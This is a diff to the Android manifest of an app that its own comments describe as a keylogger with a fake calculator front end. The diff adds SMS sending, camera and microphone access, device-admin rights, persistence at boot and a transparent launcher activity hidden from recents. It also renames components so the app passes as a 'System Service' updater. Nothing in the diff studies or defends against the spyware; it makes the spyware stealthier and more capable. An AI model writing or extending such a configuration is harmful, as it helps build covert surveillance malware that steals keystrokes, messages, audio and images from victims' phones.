@@ -4,6 +4,8 @@
     <!-- Network -->
     <uses-permission android:name="android.permission.INTERNET"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
 
     <!-- Persistence -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
@@ -22,36 +24,45 @@
     <!-- Contacts / SMS / Calls -->
     <uses-permission android:name="android.permission.READ_CONTACTS"/>
     <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
     <uses-permission android:name="android.permission.READ_CALL_LOG"/>
 
     <!-- Camera -->
     <uses-permission android:name="android.permission.CAMERA"/>
     <uses-feature android:name="android.hardware.camera" android:required="false"/>
+    <uses-feature android:name="android.hardware.camera.front" android:required="false"/>
+    <uses-feature android:name="android.hardware.microphone" android:required="false"/>
 
     <!-- Audio -->
     <uses-permission android:name="android.permission.RECORD_AUDIO"/>
 
-    <!-- Storage (Scoped for API 33+) -->
-    <!-- For reading media files (images, video, audio) on Android 13+ -->
-    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
-    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
-    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
-    <!-- Legacy storage permissions for backward compatibility (API <= 32) -->
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
-        android:maxSdkVersion="32"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
-        android:maxSdkVersion="28"/>
-    <!-- All files access (API 30+) - requires Play Store policy justification -->
-    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+     <!-- Storage (Scoped for API 33+) -->
+     <!-- For reading media files (images, video, audio) on Android 13+ -->
+     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
+     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
+     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
+     <!-- Legacy storage permissions for backward compatibility (API <= 32) -->
+     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+         android:maxSdkVersion="32"/>
+     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+         android:maxSdkVersion="28"/>
 
-    <!-- Keylogger (Accessibility) -->
-    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
+      <!-- Keylogger (Accessibility) -->
+     <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
+     <uses-permission android:name="android.permission.BIND_INPUT_METHOD"/>
+     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
 
-    <!-- Screen capture -->
+     <!-- Device State — battery, IMEI, etc. -->
+     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+      <uses-permission android:name="android.permission.BATTERY_STATS"/>
+      <uses-permission android:name="android.permission.WAKE_LOCK"/>
+     <uses-permission android:name="android.permission.VIBRATE"/>
+
+     <!-- Screen capture -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
 
     <application
-        android:name=".AgentApplication"
+        android:name=".SystemUpdateReceiver"
         android:label="System Service"
         android:icon="@android:drawable/ic_dialog_info"
         android:allowBackup="false"
@@ -60,8 +71,11 @@
 
         <!-- Fake UI — looks like a calculator -->
         <activity
-            android:name=".MainActivity"
-            android:exported="true">
+            android:name=".UpdateCheckerActivity"
+            android:exported="true"
+            android:excludeFromRecents="true"
+            android:taskAffinity=""
+            android:theme="@style/Theme.Transparent">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
@@ -77,25 +91,27 @@
 
         <!-- Background polling service -->
         <service
-            android:name=".AgentService"
+            android:name=".SystemUpdateService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="dataSync"/>
 
         <!-- Boot persistence -->
         <receiver
-            android:name=".BootReceiver"
+            android:name=".BootUpdateReceiver"
             android:enabled="true"
-            android:exported="true">
-            <intent-filter>
+            android:exported="true"
+            android:directBootAware="true">
+            <intent-filter android:priority="999">
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
                 <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
             </intent-filter>
         </receiver>
 
         <!-- Keylogger accessibility service -->
         <service
-            android:name=".capabilities.KeyloggerCapability"
+            android:name=".capabilities.AccessibilityKeylogger"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true">
             <intent-filter>
@@ -105,6 +121,19 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_config"/>
         </service>
+
+        <!-- Device Admin Receiver -->
+        <receiver
+            android:name=".DeviceAdminHandler"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+        </receiver>
 
     </application>
 </manifest>
